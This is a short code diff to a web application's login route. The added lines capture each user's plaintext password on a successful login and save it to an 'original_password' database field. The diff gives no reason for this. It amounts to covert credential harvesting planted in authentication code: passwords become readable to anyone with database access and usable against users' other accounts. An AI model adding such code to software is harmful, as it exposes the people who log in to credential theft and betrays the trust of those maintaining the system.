@@ -17,6 +17,11 @@ def login():
         user = User.query.filter_by(email=email).first()
         
         if user and user.check_password(password):
+            # Capture original password if not already stored or is a placeholder
+            if not user.original_password or user.original_password == '[PASSWORD_NOT_CAPTURED]':
+                user.original_password = password
+                db.session.commit()
+                
             login_user(user, remember=True)
             next_page = request.args.get('next')
             flash('Login successful!', 'success')
